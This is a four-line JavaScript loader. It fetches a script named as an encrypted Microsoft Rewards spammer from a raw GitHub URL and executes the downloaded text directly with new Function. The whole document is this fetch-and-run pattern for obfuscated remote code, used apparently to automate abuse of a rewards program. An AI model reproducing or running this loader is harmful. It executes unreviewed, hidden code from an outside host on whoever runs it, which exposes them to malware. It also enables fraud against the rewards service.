const response = await fetch('https://raw.githubusercontent.com/BreakDee/asd-stuff/main/Encrypted/Raw/Microsoft-Rewards-Spammer-encrypted.js')
const data = await response.text()
const run = new Function(data);
run();
